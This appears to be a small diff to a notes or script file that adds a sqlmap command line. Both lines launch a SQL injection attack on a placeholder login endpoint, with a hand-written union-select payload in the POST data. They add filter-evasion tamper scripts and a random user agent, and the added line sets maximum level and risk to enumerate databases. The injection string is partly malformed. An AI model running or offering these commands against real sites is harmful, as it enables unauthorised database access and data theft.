@@ -1,1 +1,2 @@
 python sqlmap.py -u "http://example.com" --data "username=admin'&union%20select%201,2,database()%23&password=password" --dbs -v 3 --random-agent --tamper=between,space2comment,lowercase
+python sqlmap.py -u "http://example.com/login.php" --data="username=admin'&union%20select%201,2,database()%23&password=password" --dbs -v 3 --random-agent --tamper=between,space2comment,lowercase --level=5 --risk=3
